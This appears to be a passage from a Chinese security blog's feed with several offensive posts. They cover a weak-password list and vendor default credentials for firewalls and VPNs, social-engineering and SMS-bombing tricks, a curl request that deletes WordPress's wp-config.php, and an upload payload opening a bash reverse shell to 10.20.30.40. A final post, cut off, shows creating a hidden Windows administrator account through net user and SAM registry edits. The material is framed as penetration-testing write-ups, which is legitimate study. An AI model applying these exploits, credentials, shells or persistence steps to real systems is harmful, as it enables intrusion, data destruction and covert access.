abcd1234</span><br><span class="line"> 18 aaa123</span><br><span class="line"> 17 qazwsx123</span><br><span class="line"> 17 qaz123</span><br><span class="line"> 17 aaaaaa</span><br><span class="line"> 17 a123321</span><br><span class="line"> 17 12qwaszx</span><br><span class="line"> 17 123000</span><br><span class="line"> 17 11111111</span><br><span class="line"> 16 zxcvbnm123</span><br><span class="line"> 16 wang123</span><br><span class="line"> 16 s123456</span><br><span class="line"> 16 nihao123</span><br><span class="line"> 16 love1314</span><br><span class="line"> 16 caonima123</span><br><span class="line"> 16 asdasd123</span><br><span class="line"> 16 753951</span><br><span class="line"> 16 5845201314</span><br><span class="line"> 16 584520</span><br><span class="line"> 16 159357</span><br><span class="line"> 16 147258</span><br><span class="line"> 16 1123581321</span><br><span class="line"> 16 110120</span><br><span class="line"> 15 hao123</span><br><span class="line"> 15 a7758521</span><br></pre></td></tr></table></figure></p><p><strong>遇到网络设备，基本像交换机、路由器、安全设备之类的，可以尝试一下默认密码</strong></p><p>网上找到的，但忘了是哪个大佬发的了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure></p><h2 id="0x06-社工"><a href="#0x06-社工" class="headerlink" title="0x06 社工"></a>0x06 社工</h2><p>在我看来社工是很牛逼的一种攻击方式，有时可以四两拨千斤。</p><p>像教育站，登陆账号可能是学号，密码是身份证后六位。百度查xxx学校一卡通丢失，一般就能从某学生的失物启示找到学号。</p><p>或者在文章标题下，若存在作者名字，可能就是用户名<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti8jhd44j30r403mwg4.jpg" alt><br>密码除结合管理员电话，qq，姓名等外，还可注意下网站的一些关键词。曾挖过一个弱口令漏洞，密码是网站域名+123，都不用生成字典就进后台了。</p><p>最近刚好参加某省护网，讲个例子：对某系统爆破admin用户的密码没成功，于是在联系我们处找到了管理员的一些信息，想生成社工字典试下运气。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti8y4ebkj30rc0dhdg0.jpg" alt></p><p>本想直接用社工密码生成工具生成字典爆破一下的，但突然想到注册处可以遍历用户名是否存在</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti9fkjngj315a0ao406.jpg" alt></p><p>于是结合社工尝试几个账号，发现联系我们处的管理员的账号是姓氏首字母加名字全拼，然后一爆破，密码123456直接进去后台。并在后台的搜索处发现Sql注入，再用sqlmap神器的命令 —os-shell成功打开xpcmdshell，拿到系统权限。</p><p>社工密码字典生成,怕麻烦的可使用在线网站生成：<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiarmsq2j30tw0h5my0.jpg" alt></p><p>也可使用cupp这款工具，这是一款交互式的工具，使用比较简单</p><p>地址：<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p><p><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tibbbjjoj30tp0eogvv.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tibo6uqfj30ug04m42p.jpg" alt></p><p>看看生成的密码：<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tic28hgzj30nk0ekn58.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ticex24vj30q90cq10e.jpg" alt></p><p>另一款是cewl，它通过爬行网站获取关键信息创建一个密码字典。</p><p>但我用了下，感觉生成的字典比较多冗余信息，很多关联不大的汉字都包含在字典中，个人觉得不是特别好用。</p><p>还有最近freebuf看了一篇文章，才发现hashcat这款爆破工具也能生成社工字典，感兴趣的朋友也可以去试试。</p><p>0x07 逻辑漏洞<br>逻辑漏洞是由于一些程序员未考虑到或者为贪图省事，而造成的逻辑上的漏洞，一般waf不容易拦截，因此和弱口令漏洞都是现在相对容易挖掘的一类漏洞。逻辑漏洞种类十分丰富，这里讲登陆框的逻辑漏洞，主要介绍一些技巧给大家拓宽一下思路，讲的不全请见谅。更详细的漏洞细节大家可以在网上查找资源（绝不是因为我懒）。</p><p>注册与忘记密码模块<br>云短信接受平台</p><p>相信有些朋友在测试注册模块的时候，会使用自己的手机号，而这就带来隐患：信息泄露，和短信骚扰。</p><p>这里给大家提供两个短信接受平台，让大家免去烦恼：</p><p><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p><p><strong>遍历已注册用户</strong></p><p>这个上面的社工例子有讲，可查到用户是否存在。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tid3lj8rj30tx07ht9m.jpg" alt></p><p>**任意用户注册</p><p>注册用户不需验证码认证即可注册成功的情况下，可使用工具发包，恶意批量注册用户。</p><p><strong>修改发送包邮箱尝试覆盖注册</strong></p><p>注册时显示某用户已注册；<br>在注册新用户时抓包，更改自己的账号信息为admin用户；<br>可能可以覆盖admin用户，重新注册成功。<br>任意密码重置</p><p>修改密码时使用其他人的手机号，可抓包更改成自己的手机号。自己手机收到验证信息并输入，可更改他人密码成功。</p><p><strong>跳过验证</strong></p><p>跳过验证步骤、找回方式，直接到设置新密码页面</p><p>这里直接用乌云的例子说明应该就懂了。</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" rel="noopener">中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p><p><strong>短信轰炸</strong></p><p>短信轰炸，一般人可能抓包重放失败后就放弃了。这里有个技巧，</p><p>是从西门吹雪师傅博文里学到的绕过的姿势：</p><p>发送短信处一般每隔60秒才能发送一次<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tidgpb01j30tt0czdip.jpg" alt></p><p>但若是发包时在手机号后加上一个空格、加号或换行符等特殊字符。然后重新发送，这时若发送成功，则说明可绕过限制。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tidx88r2j30uc0fo41a.jpg" alt></p><p>此时在intruder模块只要持续递增空格就可造成无限短信轰炸</p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiebp2jmj30sw0nyk2v.jpg" alt><br><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">博文链接</a></p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><strong>越权访问目录</strong></p><p>可越权访问到后台路径，网站组件配置文件，备份文件等，当然扫目录字典也要好。</p><p><strong>修改身份标识</strong></p><p>更改成功登陆的用户的身份标识，可能就能越权访问到其他用户的页面。</p><p>例如：1、本人之前曾用test用户弱口令漏洞登陆成功，然后更改参数越权访问到admin用户；2、曾看过一漏洞：用户认证的token值是用户名加时间戳的md5值，而恰好数据包某处就有返回用户名加时间戳，然后更改时间戳前的用户名，md5后加在token上成功越权到其他用户上（这种漏洞一般需要细心查找登陆时身份认证参数的规律）</p><p>之前的任意密码重置等漏洞，其实也是修改用户身份标识，系统认证机制不完善导致漏洞出现。</p><p><strong>抓返回包</strong></p><p>在登陆时返回包可能返回用户敏感信息，此时改一改参数说不定还能越权查到其他用户信息。</p><p>或注册、找回密码发送短信邮箱时，可能直接返回验证码等</p><p>在返回包里，更改下参数为true、success、1，可能就能未授权进入后台</p><p>1登陆抓包，点击右键，抓取返回包<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiepy71tj30th0b70u7.jpg" alt><br>2观察返回的参数<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tif4gp1bj30kl08e3z8.jpg" alt><br>3更改参数<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tiffyxc3j30gi07o750.jpg" alt><br>4成功进入后台</p><p><strong>禁用js</strong></p><p>曾经碰到过一个站点，能未登陆访问后台首页，但再次点击就会退出到登陆页面。此时禁用js，然后成功访问部分功能模块，成功利用文件上传拿到webshell。</p><p>因为有些网站的Url跳转是由前端js控制，这时禁用js后说不定就能成功访问。</p><p>下面是火狐的一个禁用js的插件<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tifsq9hbj30tq05vt92.jpg" alt></p><h2 id="0x08-看网站源码信息"><a href="#0x08-看网站源码信息" class="headerlink" title="0x08 看网站源码信息"></a>0x08 看网站源码信息</h2><p>当你思路枯竭的时候不妨看看源码，它是一块宝藏，说不定就能在里面发现惊喜。有些程序员会把后台的功能链接放在前端源码中,说不定就存在未授权访问，甚至有些奇葩程序员在前端代码存放测试的账号密码。</p><p>首先给大家推荐一款工具，很强大：JSFinder</p><p>链接：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>这是一款在网站的js文件中提取URL，子域名的工具，用在后台登陆界面抓取一些敏感的js文件效果也很不错，我曾用它抓取过网站后台的一个插件源码，后台的功能链接，敏感信息，接口链接（存在xss，注入）等等。我同学还说过burp也有抓js的插件，但可惜我没找到，用这款也差不多够用了。</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tig6pniuj30tw0irte6.jpg" alt></p><p>这里讲一下乌云的一个案例，具体链接忘记了，就讲一下思路：</p><p>洞主之前发现了一个漏洞，提交后，等过一段时间再去瞧下那个站，发现系统大变样，连url的路径都改了，已经修复了吗？</p><p>但是当洞主右键查看源代码时，发现还保留着之前旧系统的链接和代码，有的只是注释了而已，关键是漏洞竟然还没修？！tql，这种开发建议直接祭天。</p><p>看js代码，甚至一些图片的链接，说不定就有一番意外的收获。比如R3start大佬的一篇博文中讲的就很精彩从JS信息泄露到Webshell</p><p>文章的思路是：</p><p>作者进行渗透时，在一个图片链接中发现了一个三级子域名，删掉URl、直接访问根路径发现了一个title是某管理平台的页面。</p><p>但页面无法正常加载，故进行目录扫描得到后台地址和后台js压缩包，然后在源码的某处JS代码中发现了多个可登录的账号。</p><p>尝试弱口令无果后，从js压缩包查到了默认密码规则。成功登陆一个普通用户，但发现权限并不大。</p><p>然后通过js代码寻找获取到了别的接口地址，发现存在越权漏洞，通过JS接口越权访问到活动管理页面获取到管理员的登陆账号。</p><p>最后找上传点，抓包改后缀拿shell一气呵成。</p><p>引用R3start师傅的一句话：</p><p>右键查看JS源码，你可能会发现… 被注释的账号密码、接口、token、真实IP、开发环境…. 永远不知道程序员在JS中给你留下了什么样的惊喜。</p><h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>上面的内容比较杂，篇幅也比较长，所以有些地方就没有展开来讲。有些地方可能讲得比较简略模糊，请大家见谅，如果有疑惑可以联系我。</p><p>顺便说下感想：</p><p>这段时间的安服实习对我带来很大的帮助，面对一些系统目标固定，不能横向渗透。C段、端口扫描、子域名挖掘等信息收集都做不了，只能硬着头皮怼目标。而做安全服务经常碰到的就是后台登陆界面，怼着怼着就成长了，毕竟孰能生巧。</p><p>虽然渗透比较艰难，但也培养了我的漏洞挖掘能力。反思下自己以前挖漏洞，都是走马观花，面对信息收集来的一大堆资产，都是随便测下就结束，并没有深入且细心地去寻找漏洞，导致之前的SRC挖掘之旅十分困难。因此希望新手在挖洞时能够更加细心，特别是挖掘SRC时，有时就得花时间一个参数一个参数去”怼”，才能有所收获。要相信，大力出奇迹！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最新版wordpress任意文件删除漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在推特上看到了一篇paper，<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">点我啊</a></p><p>wp很久没看到洞了，这个漏洞七个月之前就上报了</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941e0c68c6590fb61ce.jpg" alt></p><p>可以直接利用删除图片那个功能删除网站配置文件，导致网站只能重装。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这是我下载的最新版wordpress(4.9.6)</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719418e1d18c525441003.jpg" alt></p><p>登陆后台：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417422f20751eeb517.jpg" alt></p><p>上传张图片：</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941c262f1600ee929f9.jpg" alt><br><img src="https://www.t00ls.net/attachments/month_1806/18062719417ba7d799ffd03dac.jpg" alt></p><p>然后edit</p><p>发挥一下Curl的作用。<br>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://192.168.19.129/wordpress/wp-admin/post.php?post=7&apos; -H &apos;Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7C099559ea1580b258b82765641ac85a51576507c8c3ebb8e131b20c9eec8f65bc; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7Cba9defabde03b6acdb4a5c43fc39244efbec15913483ae43ff0b624be552f5a4; wp-settings-time-1=1530097413&apos; -d &apos;action=editattachment&amp;_wpnonce=28380b3d4a&amp;thumb=../../../../wp-config.php&apos;</span><br></pre></td></tr></table></figure><p>这里把里面的cookie和_wpnonce还有post的值换成你的。</p><p>_wpnonce在页面中：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719416e3066a6bbbff35a.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/180627194156de439440ffd6f8.jpg" alt></p><p>302跳转说明编辑成功。<br><img src="https://www.t00ls.net/attachments/month_1806/1806271941fac9a1bd5595aff2.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719414486ac7e14bbfe0e.jpg" alt></p><p>现在点击Delete Permanently即可。<br><img src="https://www.t00ls.net/attachments/month_1806/18062719410de6e321efa45d83.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417bd0b5cc4ef818d3.jpg" alt></p><p>配置文件成功删除。</p><p>漏洞原理作者博客上有细节，本意是删除缩略图。但是没有对路径做限制，导致可以任意文件删除。</p><p>作者给的修复代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p>鸡肋之处在于需要管理员权限，但是危害蛮大的。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用竞争条件（Race Condition）对目标Web应用实现RCE</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg" alt><br><strong>本文讲述了作者在某邀请测试项目中，通过对SQL注入和竞争条件（Race Condition）的组合利用，利用上传文件到服务器和服务器转移上传文件到Amazon S3的时间差，最终实现了对目标应用的RCE漏洞。由于该RCE漏洞的发现相对独特，所以作者在本文中着重从竞争条件（Race Condition）的触发机制说起，和大家分享。</strong></p><p>竞争条件（Race Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><strong>第一个上传功能点upload.php</strong><br>这里的前提是，我已经通过SQL注入获取到了目标Web应用的管理员账户凭据，然后登录到其内部管理界面后，我发现可通过该管理面板中的upload.php功能发布新闻或文章：<br><img src="https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png" alt></p><p>没做太多考虑，我就直接通过upload.php尝试上传了一个.php文件shell，但问题是该上传功能限制了对.php格式文件的上传，在变化.PhP、.php3、phpphp、空字符等形式的绕过方法后，还是不行：</p><p><img src="https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png" alt></p><p>然后，我想到了存储型XSS，能不能通过上传 .html、.xml或.svg格式文件呢？这一下上传总算成功了，但是，由于目标Web应用又会把用户上传文件转储到云端的S3存储桶中去，那在S3存储桶触发XSS也没意义了。好吧，那暂时把这个问题放一边，来看其它的。</p><p><strong>第二个上传功能点modify.php</strong><br>在没有头绪之时，我又返回管理面板中“news”栏目，想看看能不能在添加或编辑操作中发现可利用的点。此时，我注意到了“edit”功能，如下在这个非法上传文件右上端，我点击了其“edit”按钮：<br><img src="https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png" alt></p><p>然后跳出了以下包含upload to replacing the file的窗口：</p><p><img src="https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png" alt></p><p>我想到的是，它可能也是包含了限制过滤条件吧，但事实是，它没有任何后缀格式限制条件！可以上传任意文件！那就上传吧，如果没有限制条件的话，那它调用的应该不是之前的upload.php，确实是，它调用了另一上传功能点“modify.php”，以下是它的调用请求格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;fileid&quot;</span><br><span class="line"></span><br><span class="line">31337</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">picture-1.png</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;reverse.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1&apos;&quot;);</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br></pre></td></tr></table></figure><p>大功告成了吗？并没有。目标Web应用之后还会把用户上传文件转储上传到云端S3存储桶中去，也就是说，如果被传到S3中去，在目标Web应用的服务器中，我们也没shell可反弹了。</p><p>竞争条件（Race Condition）响应错误获得本地文件路径</p><p>此时，毫无头绪之际，我通过burpsuite的 intruder 模式上传操作中，发现了响应长度的异常。有时候需要发起10个左右的请求，有时候则需要发起20–30个请求，才会出现这样的响应异常。正常来说，多数请求的响应长度为1147，但奇怪的是，在其中，会夹杂着长度为1710的响应。如多次上传空内容的rc.php，其请求样式为：</p><p><img src="https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png" alt></p><p>以下是正常的长度为1147的响应：<br><img src="https://image.3001.net/images/20190929/15697498189460.png" alt></p><p>以下则是异常的长度为1710的响应，其中竟然返回了我们上传的php文件的本地路径：<br><img src="https://image.3001.net/images/20190929/15697498457248.png" alt></p><p>本想着，有了这个路径，那么完全就可以实现监听反弹了，但其实不然。当我通过浏览器访问该上传php文件后，Web应用返回了“File not Found”的提示，经再次检查后发现，该文件路径已经对应成了S3存储桶的路径了，所以，因此我猜测，我们的上传文件被目标Web应用移动到云端S3之前，在Web应用服务器中保存的时间大概会是短暂的1到2秒。</p><h4 id="用竞争条件（Race-Condition）反弹Shell并实现RCE"><a href="#用竞争条件（Race-Condition）反弹Shell并实现RCE" class="headerlink" title="用竞争条件（Race Condition）反弹Shell并实现RCE"></a>用竞争条件（Race Condition）反弹Shell并实现RCE</h4><p>根据以上的时间猜测，我就有一个想法：如果我们从客户端来触发竞争条件，通过浏览器反复请求上传文件路径，以此来争取对其的访问占有权限，这样的做法是否可行？</p><p>也就是：</p><p>在我们shell反弹服务器中设置端口监听 -&gt; 上传我们的反弹shell文件 -&gt; 发起多个请求执行竞争条件 -&gt; 获取长度异常的响应 -&gt; 从中获取上传shell文件路径并用浏览器访问并不断刷新（CTRL+R） -&gt; 以这种方式再次让目标Web应用处于竞争条件下, 我们就占有了对上传shell文件的继续访问权。</p><p>一试，果然行。以下是触发反弹shell实现RCE的竞争条件逻辑图：</p><p><img src="https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png" alt></p><p>nc端监听返回的RCE结果：<br><img src="https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png" alt></p><h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>在上传文件本身被转移到云端S3存储桶之前，我们有可能获得上传文件的本地路径。哪怕只有1或2秒，就足以触发上传shell的成功反弹；</p><p>可多对上传或编辑功能点进行分析，如果它们是独立的调用，那么则需要比较它们可具体实现的操作。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows创建隐藏用户</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/windows%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>在渗透Windows时当我们可以任意命令执行时就需要创建一个账号，然后再进行深入的渗透，为了保证渗透的隐蔽性和持久性，创建一个隐藏用户就是一个常用、基础且非常重要的技能。</p><p>为什么不直接抓admin的密码呢？因为我之前对某目标做渗透时吃了次亏，在正常的使用MSF抓密码的过程中不知道对哪里造成了损害，导致目标的admin密码被销毁，然后就登录不上……当然，抓admin的密码并登录也是可以收获很多有用的东西的，说不定桌面就放了一份密码表，但这要在已经成功创建好一个隐藏账号的前提下进行。</p><p>首先创建一个账号，Windows下以”$”结尾的就是一个隐藏账号，然后将这个账号添加入Admin组中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user wuyou$ 123456 /add</span><br><span class="line">net localgroup administrators wuyou$ /add</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/1.png" alt></p><p>如上图，使用”net user”查看时没有新创建的”wuyou$”用户<br>但是，在 计算机管理 -&gt; 本地用户和组 中还是可以找到这个隐藏账号<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/2.png" alt></p><p>所以说我们现在创建的这个隐藏账号的隐蔽性还不够高，还需要再进行一步操作。<br>打开注册表，找到下面这个位置<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/3.png" alt>.png</p><p>由于SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限（右键，然后点击权限，给予完全控制权限后重新打开注册表）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/4.png" alt></p><p>可以看到000001F4对应admin账号（随机生成一个十六进制来对应账号的name）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/5.png" alt></p><p>然后将注册表导出<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/6.png" alt></p><p>将隐藏账号的F键的值替换成admin的F键的值<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/7.png" alt></p><p>然后在cmd下删除之前创建的隐藏账号<br>net user wuyou$ /del<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/8.png" alt></p><p>然后双击执行我们之前导出并修改了的注册表文件<br><img 